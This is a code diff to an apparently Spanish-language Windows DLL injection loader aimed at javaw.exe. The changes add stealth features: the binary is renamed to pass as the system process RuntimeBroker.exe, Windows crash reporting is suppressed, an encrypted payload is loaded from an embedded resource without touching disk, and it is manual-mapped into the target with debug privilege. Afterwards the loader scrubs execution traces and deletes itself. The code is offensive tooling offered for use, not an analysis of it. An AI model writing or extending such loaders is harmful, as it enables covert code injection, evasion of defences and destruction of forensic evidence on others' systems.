@@ -9,7 +9,7 @@
 //   --txf    Use TxF (SEC_IMAGE) path instead of RAM path.
 //            TxF is NOT the automatic fallback; it must be requested explicitly.
 //
-// Deploy name: wmic.exe  (OriginalFilename in version resource must match)
+// Deploy name: RuntimeBroker.exe  (OriginalFilename in version resource must match)
 
 #include <windows.h>
 #include <tlhelp32.h>
@@ -21,6 +21,29 @@
 #include <filesystem>
 
 #include "ManualMap.h"
+#include "ForensicScrub.h"
+#include "SelfDelete.h"
+#include "resource_ids.h"
+#include "build_salt.h"
+
+// ── P4-03: Suppress WER dumps and crash popups ─────────────────────────────
+static LONG CALLBACK TopLevelVeh(PEXCEPTION_POINTERS) {
+    ExitProcess(0);
+    return EXCEPTION_EXECUTE_HANDLER;
+}
+
+static void InitWerSuppression() {
+    HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
+    if (k32) {
+        using pfnWerSetFlags = HRESULT(WINAPI*)(DWORD);
+        auto pWer = reinterpret_cast<pfnWerSetFlags>(GetProcAddress(k32, "WerSetFlags"));
+        if (pWer) {
+            constexpr DWORD kFlags = 0x0001 /*NO_HEAP*/ | 0x0020 /*NO_UI*/;
+            pWer(kFlags);
+        }
+    }
+    AddVectoredExceptionHandler(1, TopLevelVeh);
+}
 
 // ── Config ──────────────────────────────────────────────────────────────────
 static constexpr const wchar_t* kTargetProcess  = L"javaw.exe";
@@ -236,10 +259,31 @@ static bool ValidatePayloadPE(const uint8_t* buf, size_t sz, std::wstring& err) 
 #if BP_SILENT
 // Silent variant: WinMain, no console, no argv parsing.
 int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
-    std::wstring payload_path = ExeDir() + L"\\" + kDefaultPayload;
-    if (!std::filesystem::exists(payload_path)) return 1;
+    InitWerSuppression();
 
-    auto dll_bytes = LoadFile(payload_path);
+    // P4-01: Load encrypted payload directly from RCDATA resource (zero disk touch)
+    std::vector<uint8_t> dll_bytes;
+    HRSRC hRes = FindResourceW(nullptr, MAKEINTRESOURCEW(IDR_PAYLOAD_BIN), MAKEINTRESOURCEW(10));
+    if (hRes) {
+        HGLOBAL hGlob = LoadResource(nullptr, hRes);
+        if (hGlob) {
+            LPVOID pData = LockResource(hGlob);
+            DWORD resSz = SizeofResource(nullptr, hRes);
+            if (pData && resSz > 0) {
+                dll_bytes.resize(resSz);
+                memcpy(dll_bytes.data(), pData, resSz);
+                bp::DecryptPayload(dll_bytes.data(), dll_bytes.size());
+            }
+        }
+    }
+
+    // Fallback: load from disk if resource absent
+    if (dll_bytes.empty()) {
+        std::wstring payload_path = ExeDir() + L"\\" + kDefaultPayload;
+        if (std::filesystem::exists(payload_path)) {
+            dll_bytes = LoadFile(payload_path);
+        }
+    }
     if (dll_bytes.empty()) return 1;
 
     std::wstring pe_err;
@@ -260,23 +304,34 @@ int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
     if (!hProc) { DropDebugPrivilege(); return 1; }
 
     std::wstring status;
-    bool ok = bp::ManualMapInMemory(hProc, dll_bytes.data(), dll_bytes.size(), status);
+    bool ok = bp::ManualMapFileBacked(hProc, dll_bytes.data(), dll_bytes.size(), status);
     CloseHandle(hProc);
+
+    // P4-02: Scrub execution artifacts before exiting
+    bp::ScrubAllTraces();
 
     // P3-05: drop privilege immediately after inject
     DropDebugPrivilege();
+
+    // P4-03: Self-delete the loader executable from disk
+    bp::SelfDelete();
+
     return ok ? 0 : 1;
 }
 
 #else
 // Debug variant: wmain, console, full output, --txf flag.
 int wmain(int argc, wchar_t** argv) {
+    InitWerSuppression();
     std::wstring payload_path;
     bool use_txf = false;
+    bool use_ram = false;
 
     for (int i = 1; i < argc; ++i) {
         if (_wcsicmp(argv[i], L"--txf") == 0) {
             use_txf = true;
+        } else if (_wcsicmp(argv[i], L"--ram") == 0) {
+            use_ram = true;
         } else {
             payload_path = argv[i];
         }
@@ -284,18 +339,32 @@ int wmain(int argc, wchar_t** argv) {
     if (payload_path.empty())
         payload_path = ExeDir() + L"\\" + kDefaultPayload;
 
-    if (!std::filesystem::exists(payload_path)) {
-        LOG(L"[!] Payload no encontrado: %s\n", payload_path.c_str());
-        LOG(L"    Uso: BypassLoaderDbg.exe [ruta_dll] [--txf]\n");
-        return 1;
+    std::vector<uint8_t> dll_bytes;
+    if (std::filesystem::exists(payload_path)) {
+        dll_bytes = LoadFile(payload_path);
+        LOG(L"[+] Payload cargado desde disco: %s (%zu bytes)\n", payload_path.c_str(), dll_bytes.size());
+    } else {
+        HRSRC hRes = FindResourceW(nullptr, MAKEINTRESOURCEW(IDR_PAYLOAD_BIN), MAKEINTRESOURCEW(10));
+        if (hRes) {
+            HGLOBAL hGlob = LoadResource(nullptr, hRes);
+            if (hGlob) {
+                LPVOID pData = LockResource(hGlob);
+                DWORD resSz = SizeofResource(nullptr, hRes);
+                if (pData && resSz > 0) {
+                    dll_bytes.resize(resSz);
+                    memcpy(dll_bytes.data(), pData, resSz);
+                    bp::DecryptPayload(dll_bytes.data(), dll_bytes.size());
+                    LOG(L"[+] Payload extraido de RCDATA embebido (%zu bytes)\n", dll_bytes.size());
+                }
+            }
+        }
     }
 
-    auto dll_bytes = LoadFile(payload_path);
     if (dll_bytes.empty()) {
-        LOG(L"[!] No se pudo leer: %s\n", payload_path.c_str());
+        LOG(L"[!] Payload no encontrado ni en disco ni en RCDATA: %s\n", payload_path.c_str());
+        LOG(L"    Uso: BypassLoaderDbg.exe [ruta_dll] [--txf] [--ram]\n");
         return 1;
     }
-    LOG(L"[+] Payload: %s (%zu bytes)\n", payload_path.c_str(), dll_bytes.size());
 
     // P3-06: validate PE before touching any process
     std::wstring pe_err;
@@ -304,7 +373,8 @@ int wmain(int argc, wchar_t** argv) {
         return 1;
     }
 
-    LOG(L"[*] Ruta de inyeccion: %s\n", use_txf ? L"TxF (SEC_IMAGE)" : L"RAM (ManualMap)");
+    LOG(L"[*] Ruta de inyeccion: %s\n",
+        use_txf ? L"TxF (SEC_IMAGE)" : (use_ram ? L"RAM (ManualMap)" : L"SEC_IMAGE + POSIX delete"));
 
     // P3-05: elevate before OpenProcess
     EnableDebugPrivilege();
@@ -344,12 +414,18 @@ int wmain(int argc, wchar_t** argv) {
     if (use_txf) {
         LOG(L"[*] ManualMap TxF...\n");
         ok = bp::ManualMapViaTxf(hProc, dll_bytes.data(), dll_bytes.size(), status);
-    } else {
+    } else if (use_ram) {
         LOG(L"[*] ManualMap RAM...\n");
         ok = bp::ManualMapInMemory(hProc, dll_bytes.data(), dll_bytes.size(), status);
+    } else {
+        LOG(L"[*] ManualMap SEC_IMAGE + POSIX delete...\n");
+        ok = bp::ManualMapFileBacked(hProc, dll_bytes.data(), dll_bytes.size(), status);
     }
 
     CloseHandle(hProc);
+
+    // P4-02: Scrub execution artifacts before exiting
+    bp::ScrubAllTraces();
 
     // P3-05: drop privilege after inject
     DropDebugPrivilege();
